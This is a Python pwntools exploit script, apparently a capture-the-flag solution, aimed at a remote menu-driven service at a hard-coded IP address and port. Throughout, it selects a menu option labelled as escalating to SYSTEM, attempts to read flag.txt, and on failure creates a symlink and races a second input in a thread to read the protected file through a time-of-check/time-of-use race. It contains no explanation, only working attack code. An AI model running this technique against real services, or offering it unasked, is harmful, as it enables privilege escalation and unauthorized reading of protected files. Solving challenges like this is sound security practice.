from pwn import *
import re
import threading
import time

host = "143.110.186.64"
port = 33217

def trigger_race(p):
    time.sleep(0.2)
    p.sendline("flag.txt")  # Change input mid-way to flag.txt

def main():
    p = remote(host, port)
    
    p.recvuntil(b"Enter your choice:")
    
    log.info("Escalating to SYSTEM")
    p.sendline("7")
    p.recvuntil(b"Enter your choice:")
    p.sendline("7")
    p.recvuntil(b"Enter your choice:")
    
    log.info("Trying direct read of flag.txt")
    p.sendline("1")
    p.recvuntil(b"Enter filename to read:")
    p.sendline("flag.txt")
    resp = p.recvuntil(b"Enter your choice:", timeout=3).decode(errors="ignore")
    
    if "CSL{" in resp:
        print(resp)
        flag = re.search(r'CSL\{[^}]+\}', resp)
        if flag:
            log.success(f"Flag: {flag.group(0)}")
        p.close()
        return

    log.warning("Direct read failed. Trying race condition...")
    
    
    p.sendline("3")
    p.recvuntil(b"Enter target file:")
    p.sendline("dummy.txt")
    p.recvuntil(b"Enter link name:")
    p.sendline("tmp_link")
    p.recvuntil(b"Enter your choice:")
    
    p.sendline("1")
    p.recvuntil(b"Enter filename to read:")
    
    race_thread = threading.Thread(target=trigger_race, args=(p,))
    race_thread.start()
    p.sendline("tmp_link")  
    race_thread.join()

    try:
        result = p.recvuntil(b"Enter your choice:", timeout=5).decode(errors="ignore")
        if "CSL{" in result:
            print(result)
            flag = re.search(r'CSL\{[^}]+\}', result)
            if flag:
                log.success(f"Flag: {flag.group(0)}")
        else:
            log.failure("Race condition failed to retrieve flag")
            log.info(result)
    except EOFError:
        log.failure("Connection closed unexpectedly")
    
    p.sendline("8")
    p.close()

if __name__ == "__main__":
    main()